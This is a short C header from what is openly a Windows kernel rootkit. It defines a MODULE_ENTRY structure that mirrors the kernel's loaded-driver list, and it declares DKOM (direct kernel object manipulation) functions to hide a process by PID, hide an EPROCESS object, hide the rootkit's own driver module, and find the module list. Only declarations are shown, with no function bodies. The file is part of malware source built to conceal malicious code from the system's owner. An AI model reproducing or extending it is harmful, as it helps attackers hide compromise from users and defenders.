#ifndef _RK_DKOM_H_
#define _RK_DKOM_H_

#include <ntddk.h>
#include "rootkit.h"

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	ULONG  unknown[4];
	ULONG  base;
	ULONG  driver_start;
	ULONG  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
} MODULE_ENTRY, *PMODULE_ENTRY;

BOOLEAN DKOM_OnProcessHide(ULONG pid);
VOID DKOM_HideProcess( PEPROCESS eproces );
BOOLEAN DKOM_HideRootkitModule();
ULONG DKOM_GetModuleListBegin (PDRIVER_OBJECT  DriverObject);

#endif
